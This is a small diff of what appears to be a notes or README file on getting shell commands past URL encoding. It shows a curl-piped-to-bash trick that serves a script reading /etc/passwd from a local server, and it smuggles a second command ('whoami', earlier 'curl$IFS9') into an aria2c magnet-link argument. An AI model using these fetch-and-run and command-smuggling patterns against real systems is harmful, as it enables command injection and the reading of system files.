@@ -17,4 +17,4 @@ bypass url encoding for nontrivial shell commands and other copy-paste nightmare
 `mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
 `curl -s http://localhost:8080/$0 | bash`
 #### torrent magnets
-`aria2c magnet:?xt=urn:btih:test&dn=linux.iso&curl$IFS9`
+`aria2c magnet:?xt=urn:btih:test&dn=linux.iso&whoami`
